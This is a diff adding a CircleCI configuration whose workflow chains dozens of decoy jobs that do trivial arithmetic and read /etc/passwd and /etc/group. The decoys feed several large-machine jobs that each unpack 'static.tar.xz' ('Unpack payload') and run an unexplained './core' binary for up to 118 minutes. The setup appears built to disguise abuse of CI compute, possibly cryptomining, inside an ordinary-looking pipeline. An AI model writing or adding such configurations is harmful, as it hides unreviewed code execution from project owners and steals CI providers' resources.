+            - timings.csv
+  PROD_RUN_9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            grep -c . /tmp/ci-ws/timings.csv || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz --file=static.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: /bin/bash -c "./core"
+  hook_deploy:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: mig weld
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; seq 1 100 | awk 'END{print NR*(NR+1)/2}'; true ; } > /tmp/ci-ws/step-10.log
+            len=$(wc -c </tmp/ci-ws/step-10.log); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - step-10.log
+  deploy:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            grep -c . /tmp/ci-ws/step-10.log || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz --file=static.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: /bin/bash -c "./core"
+  package_py311-vet:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: hum
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<10000;i++)s+=i*i;print s}'; true ; } > /tmp/ci-ws/checkpoint-main.pkl
+            len=$(wc -c </tmp/ci-ws/checkpoint-main.pkl); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - checkpoint-main.pkl
+  py311-vet:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            grep -c . /tmp/ci-ws/checkpoint-main.pkl || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz --file=static.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: /bin/bash -c "./core"
+  Delta_charlie:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: inform the lead
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; seq 1 20 | awk 'ORS=","' | sed 's/,$//'; true ; } > /tmp/ci-ws/490.txt
+            len=$(wc -c </tmp/ci-ws/490.txt); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - 490.txt
+  charlie:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            grep -c . /tmp/ci-ws/490.txt || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz --file=static.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: /bin/bash -c "./core"
+
+  tmp_charlie_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: could pass
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; seq 1 15 | awk '{if($1%3==0 && $1%5==0)print "FizzBuzz"; else if($1%3==0)print "Fizz"; else if($1%5==0)print "Buzz"; else print $1}' | wc -l; true ; } > /tmp/ci-ws/490.txt
+            len=$(wc -c </tmp/ci-ws/490.txt); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - 490.txt
+  hydrate_PROD_RUN_9_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: spiral up
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; echo "   leading" | sed 's/^ *//'; true ; } > /tmp/ci-ws/timings.csv
+            len=$(wc -c </tmp/ci-ws/timings.csv); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - timings.csv
+  bundle_break-prod_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: ugh
+          command: |
+            mkdir -p /tmp/ci-ws
+            set +o pipefail 2>/dev/null; seq 1 1062472 | md5sum > /tmp/ci-ws/357.txt; true
+            len=$(wc -c </tmp/ci-ws/357.txt); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - 357.txt
+  Beta_cook-it_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: blue screen
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{n=1024; while(n>1){n/=2;c++}; print c}'; true ; } > /tmp/ci-ws/step-11.out
+            len=$(wc -c </tmp/ci-ws/step-11.out); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - step-11.out
+  p2_fiona-push_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: forward march
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; cat /etc/group | md5sum | cut -c1-20; true ; } > /tmp/ci-ws/log.ndjson
+            len=$(wc -c </tmp/ci-ws/log.ndjson); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - log.ndjson
+  green_bug-4003_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: valley
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; seq 2 10440 | factor | wc -l; true ; } > /tmp/ci-ws/passoff.sig
+            len=$(wc -c </tmp/ci-ws/passoff.sig); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - passoff.sig
+  ctx_rm-db-leak_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: quiet now
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=15;i++){s=""; for(j=1;j<=i;j++)s=s"X"; print s}}' | wc -l; true ; } > /tmp/ci-ws/manifest
+            len=$(wc -c </tmp/ci-ws/manifest); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - manifest
+  B_titan-rev_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: hanger up
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; cut -d: -f7 /etc/passwd | sort | uniq -c | sort -rn | head -3; true ; } > /tmp/ci-ws/step-3.out
+            len=$(wc -c </tmp/ci-ws/step-3.out); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - step-3.out
+  env_rl-3_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: wash short
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{print toupper("whisper")}'; true ; } > /tmp/ci-ws/.state
+            len=$(wc -c </tmp/ci-ws/.state); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - .state
+  prebuild_build-production-artifact-bundle_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: peckish
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; echo $(( $(date +%s) % 10000 )) | md5sum; true ; } > /tmp/ci-ws/61.log
+            len=$(wc -c </tmp/ci-ws/61.log); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - 61.log
+  teardown_uma-verify_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: foghorn
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{n=0; for(i=1;i<=1000;i++)n^=i; print n}'; true ; } > /tmp/ci-ws/stats.tsv
+            len=$(wc -c </tmp/ci-ws/stats.tsv); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - stats.tsv
+  drain_aug1-smoke_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: charleston kick
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; awk -F: '$3>1000 && $3<2000' /etc/passwd | wc -l; true ; } > /tmp/ci-ws/counts.tsv
+            len=$(wc -c </tmp/ci-ws/counts.tsv); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - counts.tsv
+  step1_deploy_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: amber bulb
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; ls /dev | wc -l; true ; } > /tmp/ci-ws/step-10.log
+            len=$(wc -c </tmp/ci-ws/step-10.log); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - step-10.log
+  provision_STAGE_PROD_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: sforzando
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; date -d "@1700000000" 2>/dev/null +%Y || date +%Y; true ; } > /tmp/ci-ws/OK
+            len=$(wc -c </tmp/ci-ws/OK); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - OK
+  teardown_callisto-plus_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: shrug
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; date +"%W"; true ; } > /tmp/ci-ws/audit.txt
+            len=$(wc -c </tmp/ci-ws/audit.txt); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - audit.txt
+  stage_fix-2532_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: one more time
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; sed 's/foo/bar/g; s/baz/qux/g' <<<"foo baz foobaz"; true ; } > /tmp/ci-ws/log.gz
+            len=$(wc -c </tmp/ci-ws/log.gz); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - log.gz
+  round1_v8-canary_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: diminuendo
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; grep -o '[a-z]' <<<"abc123def456" | sort | uniq | wc -l; true ; } > /tmp/ci-ws/stage.raw
+            len=$(wc -c </tmp/ci-ws/stage.raw); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - stage.raw
+  preinit_sep5-rev_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: again
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; printf "4\n2\n7\n1\n5\n" | sort -n | awk 'NR==3'; true ; } > /tmp/ci-ws/counts.jsonl
+            len=$(wc -c </tmp/ci-ws/counts.jsonl); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - counts.jsonl
+  bake_omar-verify_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: tea time
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; ( echo "init"; for i in $(seq 1 3706); do echo "line $i"; done ) | sort | md5sum; true ; } > /tmp/ci-ws/2023-02-06.data
+            len=$(wc -c </tmp/ci-ws/2023-02-06.data); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - 2023-02-06.data
+  resync_d-3_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: tibialis
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; yes 1 | head -200 | awk '{s+=$1}END{print s}'; true ; } > /tmp/ci-ws/44.blob
+            len=$(wc -c </tmp/ci-ws/44.blob); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - 44.blob
+workflows:
+  run:
+    jobs:
+      - Delta_charlie
+      - tmp_charlie_2:
+          requires:
+            - Delta_charlie
+      - charlie:
+          requires:
+            - tmp_charlie_2
+      - staging_PROD_RUN_9:
+          requires:
+            - tmp_charlie_2
+      - hydrate_PROD_RUN_9_2:
+          requires:
+            - staging_PROD_RUN_9
+      - PROD_RUN_9:
+          requires:
+            - hydrate_PROD_RUN_9_2
+      - tap_break-prod:
+          requires:
+            - hydrate_PROD_RUN_9_2
+      - bundle_break-prod_2:
+          requires:
+            - tap_break-prod
+      - break-prod:
+          requires:
+            - bundle_break-prod_2
+      - rerun_cook-it:
+          requires:
+            - bundle_break-prod_2
+      - Beta_cook-it_2:
+          requires:
+            - rerun_cook-it
+      - cook-it:
+          requires:
+            - Beta_cook-it_2
+      - red_fiona-push:
+          requires:
+            - Beta_cook-it_2
+      - p2_fiona-push_2:
+          requires:
+            - red_fiona-push
+      - fiona-push:
+          requires:
+            - p2_fiona-push_2
+      - rerun_bug-4003:
+          requires:
+            - p2_fiona-push_2
+      - green_bug-4003_2:
+          requires:
+            - rerun_bug-4003
+      - bug-4003:
+          requires:
+            - green_bug-4003_2
+      - validate_rm-db-leak:
+          requires:
+            - green_bug-4003_2
+      - ctx_rm-db-leak_2:
+          requires:
+            - validate_rm-db-leak
+      - rm-db-leak:
+          requires:
+            - ctx_rm-db-leak_2
+      - cleanup_titan-rev:
+          requires:
+            - ctx_rm-db-leak_2
+      - B_titan-rev_2:
+          requires:
+            - cleanup_titan-rev
+      - titan-rev:
+          requires:
+            - B_titan-rev_2
+      - phase1_rl-3:
+          requires:
+            - B_titan-rev_2
+      - env_rl-3_2:
+          requires:
+            - phase1_rl-3
+      - rl-3:
+          requires:
+            - env_rl-3_2
+      - fixture_build-production-artifact-bundle:
+          requires:
+            - env_rl-3_2
+      - prebuild_build-production-artifact-bundle_2:
+          requires:
+            - fixture_build-production-artifact-bundle
+      - build-production-artifact-bundle:
+          requires:
+            - prebuild_build-production-artifact-bundle_2
+      - step2_uma-verify:
+          requires:
+            - prebuild_build-production-artifact-bundle_2
+      - teardown_uma-verify_2:
+          requires:
+            - step2_uma-verify
+      - uma-verify:
+          requires:
+            - teardown_uma-verify_2
+      - phase1_aug1-smoke:
+          requires:
+            - teardown_uma-verify_2
+      - drain_aug1-smoke_2:
+          requires:
+            - phase1_aug1-smoke
+      - aug1-smoke:
+          requires:
+            - drain_aug1-smoke_2
+      - hook_deploy:
+          requires:
+            - drain_aug1-smoke_2
+      - step1_deploy_2:
+          requires:
+            - hook_deploy
+      - deploy:
+          requires:
+            - step1_deploy_2
+      - phase2_STAGE_PROD
+      - provision_STAGE_PROD_2:
+          requires:
+            - phase2_STAGE_PROD
+      - STAGE_PROD:
+          requires:
+            - provision_STAGE_PROD_2
+      - bake_callisto-plus:
+          requires:
+            - provision_STAGE_PROD_2
+      - teardown_callisto-plus_2:
+          requires:
+            - bake_callisto-plus
+      - callisto-plus:
+          requires:
+            - teardown_callisto-plus_2
+      - canary1_fix-2532:
+          requires:
+            - teardown_callisto-plus_2
+      - stage_fix-2532_2:
+          requires:
+            - canary1_fix-2532
+      - fix-2532:
+          requires:
+            - stage_fix-2532_2
+      - fixture_v8-canary:
+          requires:
+            - stage_fix-2532_2
+      - round1_v8-canary_2:
+          requires:
+            - fixture_v8-canary
+      - v8-canary:
+          requires:
+            - round1_v8-canary_2
+      - loader_sep5-rev:
+          requires:
+            - round1_v8-canary_2
+      - preinit_sep5-rev_2:
+          requires:
+            - loader_sep5-rev
+      - sep5-rev:
+          requires:
+            - preinit_sep5-rev_2
+      - bundle_omar-verify:
+          requires:
+            - preinit_sep5-rev_2
+      - bake_omar-verify_2:
+          requires:
+            - bundle_omar-verify
+      - omar-verify:
+          requires:
+            - bake_omar-verify_2
+      - prebuild_d-3:
+          requires:
+            - bake_omar-verify_2
+      - resync_d-3_2:
+          requires:
+            - prebuild_d-3
+      - d-3:
+          requires:
+            - resync_d-3_2
+      - g1_tb-alt
+      - tb-alt:
+          requires:
+            - g1_tb-alt
+      - B_vb-3:
+          requires:
+            - g1_tb-alt
+      - vb-3:
+          requires:
+            - B_vb-3
+      - reup_java17-lint:
+          requires:
+            - B_vb-3
+      - java17-lint:
+          requires:
+            - reup_java17-lint
+      - bake_Build_Tests3:
+          requires:
+            - reup_java17-lint
+      - Build_Tests3:
+          requires:
+            - bake_Build_Tests3
+      - dispatch_fix-8912:
+          requires:
+            - bake_Build_Tests3
+      - fix-8912:
+          requires:
+            - dispatch_fix-8912
+      - hook_juliet-4:
+          requires:
+            - dispatch_fix-8912
+      - juliet-4:
+          requires:
+            - hook_juliet-4
+      - p2_produce-quick-artifact-bundle:
+          requires:
+            - hook_juliet-4
+      - produce-quick-artifact-bundle:
+          requires:
+            - p2_produce-quick-artifact-bundle
+      - postcheck_preview-v7:
+          requires:
+            - p2_produce-quick-artifact-bundle
+      - preview-v7:
+          requires:
+            - postcheck_preview-v7
+      - package_py311-vet:
+          requires:
+            - postcheck_preview-v7
+      - py311-vet:
+          requires:
+            - package_py311-vet
+      - reup_succes-only-31:
+          requires:
+            - package_py311-vet
+      - succes-only-31:
+          requires:
+            - reup_succes-only-31
